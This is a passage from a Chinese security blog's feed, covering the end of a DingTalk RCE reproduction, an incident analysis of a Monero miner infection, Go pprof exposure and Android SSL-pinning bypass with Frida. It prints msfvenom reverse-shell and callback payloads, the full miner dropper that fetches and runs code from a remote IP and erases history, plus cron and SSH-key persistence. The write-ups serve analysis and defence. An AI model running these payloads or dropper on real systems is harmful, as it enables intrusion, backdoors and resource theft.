–platform windows -p windows&#x2F;exec cmd&#x3D;&quot;curl kaili.erojuu.dnslog.cn&quot; -e x86&#x2F;alpha_mixed -f csharp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把生成的shellcode替换到：</p><pre class="line-numbers language-none"><code class="language-none">var shellcode&#x3D;new Uint8Array([.....])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再去触发</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202161807244.png" alt="image-20220216174452158"></p><p>只不过这个命令或产生一个curl的命令界面</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202161807245.png" alt="image-20220216174522170"></p><p>使用powershell，依然会有那么一闪而过的页面</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command &quot;curl kaili.erojuu.dnslog.cn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹shell</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.36.130 LPORT&#x3D;8834 -e x86&#x2F;shikata_ga_nai -f csharp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202161807246.png" alt="image-20220216175954719"></p><p>当然如果没有复现成功，查看一下自己的版本是否正确，他会自动升级，如果显示如下，有可能是自己升级了。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202161807247.png" alt="image-20220216173847471"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;钉钉RCE&quot;&gt;&lt;a href=&quot;#钉钉RCE&quot; class=&quot;headerlink&quot; title=&quot;钉钉RCE&quot;&gt;&lt;/a&gt;钉钉RCE&lt;/h3&gt;&lt;p&gt;大佬的POC：&lt;a href=&quot;https://github.com/crazy0x70/dingtalk-RCE&quot;
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XMR门罗币挖矿应急</title>
    <link href="https://misakikata.github.io/2022/02/XMR%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%BA%94%E6%80%A5/"/>
    <id>https://misakikata.github.io/2022/02/XMR门罗币挖矿应急/</id>
    <published>2022-02-08T08:39:02.000Z</published>
    <updated>2022-02-08T08:39:02.676Z</updated>
    
    <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">curl -O 2.58.149.237:6972&#x2F;hoze<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202081637259.png" alt="image-20220117135255528"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202081637261.png" alt="image-20220117135335865"></p><p>文件内容为：</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bashcores&#x3D;$(nproc)temp&#x3D;$(cat &#x2F;proc&#x2F;meminfo | grep MemAvailable | awk  &#39;&#123;print$2&#125;&#39;)ram&#x3D;$(expr $temp &#x2F; 1000)echo $coresecho $ram#ram&#x3D;10rm -rf hozerm -rf &#x2F;var&#x2F;tmp&#x2F;hoze[[ ! $(uname -a) &#x3D;~ &quot;x86_64&quot; ]] &amp;&amp; exit#####################################function SlowAndSteady &#123;cd &#x2F;var&#x2F;tmp ; curl -O 2.58.149.237:6972&#x2F;xri3.tar || cd1 -O 2.58.149.237:6972&#x2F;xri3.tar || wget 2.58.149.237:6972&#x2F;xri3.tar &amp;&amp; tar -xvf xri3.tar &amp;&amp; mv xri3 .xri &amp;&amp; rm -rf xri3.tar &amp;&amp; cd .xri ; chmod +x * ; .&#x2F;init0 ; history -c ; rm -rf ~&#x2F;.bash_history​&#125;​function MoneyFactory &#123;cd &#x2F;var&#x2F;tmp ; curl -O 2.58.149.237:6972&#x2F;xrx2.tar || cd1 -O 2.58.149.237:6972&#x2F;xrx2.tar || wget 2.58.149.237:6972&#x2F;xrx2.tar &amp;&amp; tar -xvf xrx2.tar &amp;&amp; mv xrx2 .xrx &amp;&amp; rm -rf xrx.tar &amp;&amp; cd .xrx ; chmod +x * ; .&#x2F;init0 ; history -c ; rm -rf ~&#x2F;.bash_history​&#125;#####################################rm -rf &#x2F;var&#x2F;tmp&#x2F;.xrirm -rf &#x2F;var&#x2F;tmp&#x2F;.xrxrm -rf &#x2F;var&#x2F;tmp&#x2F;.xpkill -9 xripkill -9 xrxpkill -STOP xmrigpkill -STOP Operarm -rf ~&#x2F;Opera​#####################################if [ &quot;$EUID&quot; &#x3D; 0 ]; then    chmod 755 &#x2F;usr&#x2F;bin&#x2F;chattr &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    chattr -ia &#x2F;etc&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    rm -rf &#x2F;etc&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    chattr -R -ia &#x2F;var&#x2F;spool&#x2F;cron &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    chattr -ia &#x2F;etc&#x2F;crontab &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    chattr -R -ia &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1    chattr -R -ia &#x2F;etc&#x2F;cron.d &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1fichattr -ia &#x2F;tmp&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1rm -rf &#x2F;tmp&#x2F;newinit.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1echo &quot;crontab info:&quot;crontab -lcrontab -r &gt; &#x2F;dev&#x2F;nullchattr -ia &#x2F;etc&#x2F;zzh &gt; &#x2F;dev&#x2F;nullchattr -ia &#x2F;tmp&#x2F;zzh &gt; &#x2F;dev&#x2F;nullrm -rf &#x2F;etc&#x2F;zzh &gt; &#x2F;dev&#x2F;nullrm -rf &#x2F;tmp&#x2F;zzh &gt; &#x2F;dev&#x2F;nullpkill -f &quot;zzh&quot; &gt; &#x2F;dev&#x2F;nullchattr -ia &#x2F;tmp&#x2F;.ice-unix &gt; &#x2F;dev&#x2F;nullrm -rf &#x2F;tmp&#x2F;.ice-unix &gt; &#x2F;dev&#x2F;nullchattr -ia &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pnscan &gt; &#x2F;dev&#x2F;nullrm -rf &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pnscan &gt; &#x2F;dev&#x2F;nullpkill -f &quot;pnscan&quot; &gt; &#x2F;dev&#x2F;nullmv &#x2F;bin&#x2F;top.original &#x2F;bin&#x2F;top#####################################if (( $cores &lt; 4 )) || (( $ram &lt; 2300 )) ; then    echo &quot;installing trtl miner&quot;    SlowAndSteadyelif (( $cores &gt;&#x3D; 4 )) &amp;&amp; (( $ram &gt;&#x3D; 2300 )) ; then        echo &quot;installing xmr miner&quot;    SlowAndSteadyfi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前几步是用来判断系统的内存和进程限制，但对后面的运行实际没有区别，非x86架构则直接退出运行。中间有个下载文件，是一个二进制文件，下载下来查看一下。</p><pre class="line-numbers language-none"><code class="language-none">curl -O 2.58.149.237:6972&#x2F;xri3.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202202081637262.png" alt="image-20220117144846484"></p><p>后门先进行进程的清理，然后在root下修改定时任务文件，删除了一个shell文件<code>/etc/newinit.sh</code>，我去查了一下这个文件，发现也是一个挖矿的定时程序，原来是先把别的程序给他删了，再去执行自己的。同时修改文件的属性，便于更改。后续还删除了<code>pnscan</code>，这个是针对reids的挖矿病毒，会修改top文件为top.original，这里也贴心的帮你修改过来了。</p><p>原pnscan病毒会修改top为：<code>echo &quot;top.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;&gt;&gt;/bin/top</code></p><p>只是它还会修改ps命令，这里没有修改回来，看来还不够贴心。</p><p>不管你系统是多少内存啥的，反正都给你运行函数<code>SlowAndSteady</code>。会解压在&#x2F;var&#x2F;tmp目录下，更改名称为.xri。执行目录下的<code>chmod +x * ; ./init0</code>，同时给你删除掉命令记录，同时删除下载的压缩包。</p><p>从文件内看到一个key文件，里面是ssh的公钥，说明保留采用公钥的方式登陆的后门。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会在&#x2F;etc&#x2F;crontab里写入定时任务</p><pre class="line-numbers language-none"><code class="language-none">@weekly root &#x2F;var&#x2F;tmp&#x2F;.x&#x2F;secure@reboot root &#x2F;var&#x2F;tmp&#x2F;.x&#x2F;secure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>config里配置了门罗币的地址</p><pre class="line-numbers language-none"><code class="language-none">&quot;url&quot;: &quot;5.9.157.2:10380&quot;,            &quot;user&quot;: &quot;TRTLv1M57YFZjutXRds3cNd6iRurtebcy6HxQ6hRMCzGF5nE4sWuqCCX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKTze3C&quot;,            &quot;pass&quot;: &quot;x&quot;,            &quot;rig-id&quot;: &quot;pooled&quot;,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>执行的程序为&#x2F;var&#x2F;tmp&#x2F;.xri下的xri文件，后续还会在&#x2F;var&#x2F;tmp&#x2F;.x下把scp和secure拷贝进来，上面的定时任务也是针对这个secure文件。</p><p>程序还会在创建一个cheeki的普通用户，密码写在shadow文件内，看起来是跟root一个密码。但是这个密码是修改过，也就是root的密码修改为其他密码了。</p><pre class="line-numbers language-none"><code class="language-none">root:$6$u3a2aCKC$TULEOlBwPWBIAYZkG0NNNbWM.9tRozeHUO2HyRvlTQpekaOQ2E3S5E5&#x2F;gqyOnVAtaF8G41oZS0KRioLw7PfzT1:19011:0:99999:7:::bin:*:18353:0:99999:7:::daemon:*:18353:0:99999:7:::adm:*:18353:0:99999:7:::lp:*:18353:0:99999:7:::sync:*:18353:0:99999:7:::shutdown:*:18353:0:99999:7:::halt:*:18353:0:99999:7:::mail:*:18353:0:99999:7:::operator:*:18353:0:99999:7:::games:*:18353:0:99999:7:::ftp:*:18353:0:99999:7:::nobody:*:18353:0:99999:7:::systemd-network:!!:19011::::::dbus:!!:19011::::::polkitd:!!:19011::::::sshd:!!:19011::::::postfix:!!:19011::::::chrony:!!:19011::::::cheeki:$6$u3a2aCKC$TULEOlBwPWBIAYZkG0NNNbWM.9tRozeHUO2HyRvlTQpekaOQ2E3S5E5&#x2F;gqyOnVAtaF8G41oZS0KRioLw7PfzT1:19011:0:99999:7:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>scp文件从作用上看，是负责进程维护和修改定时任务的</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bashwhile true; do &#x2F;var&#x2F;tmp&#x2F;.x&#x2F;secure ; sleep 10; done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>从进程中scp启动后，xri才会出现，也就是xri至少是secure产生的，init.sh里面倒是写明白了启动xri并且使用diswon后台维护。整个流程中secure是关键运行文件。</p><p>因此需要查看被爆破的用户是哪个，去除密钥和用户，删除定时任务和进程。重启之前记得修改root密码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;curl -O 2.58.149.237:6972&amp;#x2F;hoze&lt;span aria-hidden=&quot;true&quot; class=&quot;line-
      
    
    </summary>
    
    
      <category term="shell" scheme="https://misakikata.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>Go 内存泄露</title>
    <link href="https://misakikata.github.io/2021/12/Go-%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2/"/>
    <id>https://misakikata.github.io/2021/12/Go-内存泄露/</id>
    <published>2021-12-28T10:30:03.000Z</published>
    <updated>2021-12-28T10:31:44.854Z</updated>
    
    <content type="html"><![CDATA[<h3 id="goroutine泄露"><a href="#goroutine泄露" class="headerlink" title="goroutine泄露"></a>goroutine泄露</h3><p>这里所说的Go内存泄露是指goroutine泄露。如果你启动了1个goroutine，但并没有符合预期的退出，直到程序结束，此goroutine才退出，这种情况就是goroutine泄露。在此之前先来认识一下pprof，pprof是Go的性能分析工具，在程序运行过程中，可以记录程序的运行信息，可以是CPU使用情况、内存使用情况、goroutine运行情况等。</p><p>Go已经有一个封装好的<code>net/http/pprof</code>，使用简单的几行命令，就可以开启pprof，记录运行信息，并且提供了Web服务。</p><p>如果一个存在的Go内存泄露情况如下：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxxx&#x2F;debug&#x2F;pprof&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831635.png" alt="image-20211228111613802"></p><p>allocs：所有过去内存分配的样本<br>block：导致同步阻塞的堆栈跟踪<br>cmdline：当前程序的命令行调用<br>goroutine：所有当前 goroutine 的堆栈跟踪<br>heap：活动对象的内存分配示例。 您可以指定 gc GET 参数以在获取堆样本之前运行 GC。<br>mutex：竞争互斥体持有者的堆栈跟踪<br>profile：CPU 配置文件。 您可以在 seconds GET 参数中指定持续时间。 获取配置文件后，使用 go tool pprof 命令调查配置文件。<br>threadcreate：导致创建新操作系统线程的堆栈跟踪<br>trace：当前程序执行的轨迹。 您可以在 seconds GET 参数中指定持续时间。 获取跟踪文件后，使用 go tool trace 命令调查跟踪。</p><p>比如点一个cmdline，查看运行的命令，也许会包括账号密码。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;debug&#x2F;pprof&#x2F;cmdline?debug&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831637.png" alt="image-20211228111836637"></p><p>点击profile或者trace的时候会下载一个编译的文件，里面含有进程信息以及程序信息。使用如下命令查看，可以看到这是一个so文件。</p><pre class="line-numbers language-none"><code class="language-none">go tool pprof .\profile# go tool pprof http:&#x2F;&#x2F;xxx&#x2F;profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831638.png" alt="image-20211228112643219"></p><p>查看进程函数占用，查看命令介绍可以使用help。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831639.png" alt="image-20211228113041465"></p><p>也可以下载heap查看，需要删掉链接上自动带的debug&#x3D;1。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831640.png" alt="image-20211228131632457"></p><p>这个heap文件写的是什么</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;debug&#x2F;pprof&#x2F;goroutine?debug&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831641.png" alt="image-20211228133437841"></p><p>大概能看出来的是有62个goroutine被挂起，不能退出。这里面有6个goroutine挂在了wss_client.go的104行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831642.png" alt="image-20211228134321120"></p><h3 id="pprof分析"><a href="#pprof分析" class="headerlink" title="pprof分析"></a>pprof分析</h3><p>先安装一个graphviz：<a href="https://graphviz.gitlab.io/_pages/Download/Download_windows.html">https://graphviz.gitlab.io/_pages/Download/Download_windows.html</a> </p><pre class="line-numbers language-none"><code class="language-none">go tool pprof --http&#x3D;&quot;:8999&quot; https:&#x2F;&#x2F;xxxx&#x2F;debug&#x2F;pprof&#x2F;heap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831643.png" alt="image-20211228142010787"></p><p>颜色越深越大的代表占用和耗时越多</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112281831644.png" alt="image-20211228142130766"></p><h3 id="goroutine-泄露的场景"><a href="#goroutine-泄露的场景" class="headerlink" title="goroutine 泄露的场景"></a>goroutine 泄露的场景</h3><p>goroutine泄露的本质是channel阻塞，无法继续向下执行，导致此goroutine关联的内存都无法释放，进一步造成内存泄露。</p><ol><li>channel的读或者写：<ol><li>无缓冲channel的阻塞通常是写操作因为没有读而阻塞</li><li>有缓冲的channel因为缓冲区满了，写操作阻塞</li><li>期待从channel读数据，结果没有goroutine写</li></ol></li><li>select操作，select里也是channel操作，如果所有case上的操作阻塞，goroutine也无法继续执行。</li></ol><p>参考文章：</p><p><a href="https://segmentfault.com/a/1190000019222661">https://segmentfault.com/a/1190000019222661</a></p><p><a href="https://segmentfault.com/a/1190000019644257">https://segmentfault.com/a/1190000019644257</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;goroutine泄露&quot;&gt;&lt;a href=&quot;#goroutine泄露&quot; class=&quot;headerlink&quot; title=&quot;goroutine泄露&quot;&gt;&lt;/a&gt;goroutine泄露&lt;/h3&gt;&lt;p&gt;这里所说的Go内存泄露是指goroutine泄露。如果你启动了1个g
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android认证方式和绕过</title>
    <link href="https://misakikata.github.io/2021/12/Android%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%E5%92%8C%E7%BB%95%E8%BF%87/"/>
    <id>https://misakikata.github.io/2021/12/Android认证方式和绕过/</id>
    <published>2021-12-22T08:28:34.000Z</published>
    <updated>2021-12-23T08:28:27.718Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>源码来自：<a href="https://github.com/Ch3nYe/httpstest">https://github.com/Ch3nYe/httpstest</a></p><p>参考文章：<a href="https://ch3nye.top/Android-HTTPS%E8%AE%A4%E8%AF%81%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%92%8C%E5%AF%B9%E6%8A%97%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93">https://ch3nye.top/Android-HTTPS%E8%AE%A4%E8%AF%81%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%92%8C%E5%AF%B9%E6%8A%97%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93</a></p><p>打包好的<a href="/images/file/httpstest.zip">APP</a>，启动目录下的http_server，同时修改host把<a href="http://www.test.com指向本地。包名为：com.example.httpstest">www.test.com指向本地。包名为：com.example.httpstest</a></p><p>安装后如下所示：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622097.png" alt="image-20211216112037976"></p><p>然后为了方便代理，我们安装一个ProxyDroid：<a href="https://github.com/madeye/proxydroid">https://github.com/madeye/proxydroid</a></p><p>可以从谷歌商店代理下载：<a href="https://apkpure.com/store/apps/details?id=org.proxydroid">https://apkpure.com/store/apps/details?id=org.proxydroid</a></p><p>这个东西是利用Android iptables代理，捕获所有APP数据包。一般做WiFi代理的话，有些流量不会走代理，或者还可以使用VPN的代理模式比如Postern。</p><p>一开始的两个直接做了代理就可以抓到，就不演示了。</p><h3 id="HTTPS系统证书校验"><a href="#HTTPS系统证书校验" class="headerlink" title="HTTPS系统证书校验"></a>HTTPS系统证书校验</h3><p>在Android7以上的系统，用户证书不再信任，此处配置证书到系统证书目录。</p><pre class="line-numbers language-none"><code class="language-none">openssl x509 -inform DER -in burp.der -out cacert.pemopenssl x509 -inform PEM -subject_hash_old -in cacert.pem     &#x3D;&gt;  hashmv cacert.pem &lt;hash&gt;.0adb push hash.0 &#x2F;sdcard    &#x2F;&#x2F;由于系统读写权限问题，不一定能直接上传到system目录。mount -o remount,rw &#x2F;system   &#x2F;&#x2F;root权限下执行cp &#x2F;sdcard&#x2F;hash.0 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;chmod 644 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;hash.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一行就是那个hash</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622099.png" alt="image-20211216135309890"></p><p>后续点击执行</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622100.png" alt="image-20211216135944342"></p><h3 id="SSLPINNING-代码校验"><a href="#SSLPINNING-代码校验" class="headerlink" title="SSLPINNING 代码校验"></a>SSLPINNING 代码校验</h3><p>这里的校验是公钥，由于中间穿插了burp，所以burp即是客户端，又是服务端，app校验的是burp的公钥导致校验失败。此处使用的是frida，先去下载frida：<a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><pre class="line-numbers language-none"><code class="language-none">adb push frida-server &#x2F;data&#x2F;local&#x2F;tmpadb forward tcp:27042 tcp:27042adb forward tcp:27043 tcp:27043cd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;chmod 755 frida-server.&#x2F;frida-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作者提供了一个frida脚本，但是按照使用方式我这边会重启模拟器，也许是模拟器的原因？这里按照一个python脚本来调用这个js脚本。</p><pre class="line-numbers language-none"><code class="language-none">#coding:utf8import frida, sys,os,json,codecsimport subprocessimport timeimport ctypesif (len(sys.argv) &#x3D;&#x3D; 3):    jsfile &#x3D; str(sys.argv[1].strip())    package_name &#x3D; str(sys.argv[2]).strip()else:  print &quot;Usage: python frida_attach.py [hook.js] [package_name] &quot;  sys.exit(1)def print_result(message):    print (&quot;[!] Received: [%s]&quot; %(message))def stringFromArray(data):    ret &#x3D; &#39;&#39;    for i in data:        value &#x3D; ctypes.c_uint8(i).value        if value &#x3D;&#x3D; 0:            continue        if value &lt;&#x3D;127:            ret +&#x3D; chr(value)        else:            ret +&#x3D; &#39;\\x&#39; + hex(value)[2:]    return retdef hex_stringFromArray(data):    ret &#x3D; &#39;[&#39;    for i in data:        value &#x3D; ctypes.c_uint8(i).value        ret +&#x3D; hex(value) + &quot;,&quot;    return ret + &quot;]&quot;def on_message(message, data):    print(data)    if &#39;payload&#39; in message:        data &#x3D; message[&#39;payload&#39;]        if type(data) is list:            print stringFromArray(data)        else:            print data       else:        if message[&#39;type&#39;] &#x3D;&#x3D; &#39;error&#39;:            print (message[&#39;stack&#39;])        else:            print messagedef main():    with codecs.open(jsfile, &#39;r&#39;, encoding&#x3D;&#39;utf8&#39;) as f:         jscode  &#x3D; f.read()    process &#x3D; frida.get_device_manager().enumerate_devices()[-1].attach(package_name)    script &#x3D; process.create_script(jscode)    script.on(&#39;message&#39;, on_message)    script.load()    sys.stdin.read()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行如下后，就可以bypass。</p><pre class="line-numbers language-none"><code class="language-none">python .\frida_attach.py .\new_sslpinning.js httpstest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622101.png" alt="image-20211216154316093"></p><p>配置文件校验跟上面的形式差不多，只是一个代码实现，一个在<code>res/xml/network_security_config.xml</code>配置文件中实现。</p><p>单向校验的话，还可以使用Xposed和justtrustme一起配合来绕过。</p><h3 id="双向校验"><a href="#双向校验" class="headerlink" title="双向校验"></a>双向校验</h3><p>需要先启动目录下的http_server服务，如果访问的话，浏览器会显示异常的链接请求。</p><p>需要先把certs目录下的client.p12安装到访问浏览器，密码是clientpassword。再去访问浏览器发现可以显示，同样需要把证书加到burp，让证书可以用证书进行认证。</p><p>在user options – TLS – Client TLS certificates中添加，填入域名<a href="http://www.test.com,输入密码即可./">www.test.com，输入密码即可。</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622102.png" alt="image-20211216161336849"></p><p>也就是如果需要绕过这种双向验证，需要客户端的证书来对请求进行身份验证。一般情况下这个证书获取从APP</p><p>解压，查看assets或者res目录内，查找是否有pfx、cer、p12格式的证书。最后我们需要导入p12的证书。</p><h4 id="frida-1"><a href="#frida-1" class="headerlink" title="frida(1)"></a>frida(1)</h4><p>当然不少的APP可能存在加壳加密等办法，证书和密码的获取不是那么简单，这里提供一种利用frida来获取证书和密钥的办法。</p><p>下载frida-extract-keystore：<a href="https://gist.github.com/ceres-c/cb3b69e53713d5ad9cf6aac9b8e895d2">https://gist.github.com/ceres-c/cb3b69e53713d5ad9cf6aac9b8e895d2</a></p><p>运行脚本后，会自动的启动APP，需要在脚本内修改APP包名，点击需要执行的功能，也就是触发请求。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622103.png" alt="image-20211217113149894"></p><p>脚本会自动抓取写在代码内的密码和保存证书，以jks的形式。然后需要去提取公钥。</p><pre class="line-numbers language-none"><code class="language-none">keytool -list -rfc -keystore .\keystore1.jks -storepass clientpassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把显示的内容保存在cer格式的证书中。导出私钥先转换为pfx。</p><pre class="line-numbers language-none"><code class="language-none">keytool -v -importkeystore -srckeystore server.jks -srcstoretype jks -srcstorepass clientpassword -destkeystore server.pfx -deststoretype pkcs12 -deststorepass clientpassword -destkeypass 12345678<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用pfx导出key，密码还是上面查到的密码</p><pre class="line-numbers language-none"><code class="language-none">openssl pkcs12 -in server.pfx -nocerts -nodes -out server.key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再利用key和证书生成p12证书，可以导入burp的那种，密码是我们上面设置的12345678。</p><pre class="line-numbers language-none"><code class="language-none">openssl pkcs12 -export -clcerts -in client-cert.cer -inkey client-key.key -out client.p12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当没有配置证书的时候，抓包显示Communication error。配置进行这个p12。密码为12345678</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622104.png" alt="image-20211217134216895"></p><p>再次访问即可成功。</p><h4 id="frida-2"><a href="#frida-2" class="headerlink" title="frida(2)"></a>frida(2)</h4><p>如果能获取证书，但是需要查找密码，而又懒得去解包或者不好脱壳，可以尝试查密码的frida脚本。</p><p>frida js ：<a href="https://raw.githubusercontent.com/m0bilesecurity/Frida-Mobile-Scripts/master/Android/tracer_keystore.js">https://raw.githubusercontent.com/m0bilesecurity/Frida-Mobile-Scripts/master/Android/tracer_keystore.js</a></p><p>使用上面的python2脚本来调用。</p><pre class="line-numbers language-none"><code class="language-none">python .\frida_attach.py .\tracer_keystore.js httpstest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击触发功能，会显示如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112231622105.png" alt="image-20211217134908128"></p><p>由于可以解包获取其中的p12证书，所以直接导入证书和密码到burp即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h3&gt;&lt;p&gt;源码来自：&lt;a href=&quot;https://github.com/Ch3nYe/httpstest&quot;&gt;https://github.com/
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>洞态IAST初使用</title>
    <link href="https://misakikata.github.io/2021/12/%E6%B4%9E%E6%80%81IAST%E5%88%9D%E4%BD%BF%E7%94%A8/"/>
    <id>https://misakikata.github.io/2021/12/洞态IAST初使用/</id>
    <published>2021-12-09T03:10:04.000Z</published>
    <updated>2023-01-09T03:16:50.249Z</updated>
    
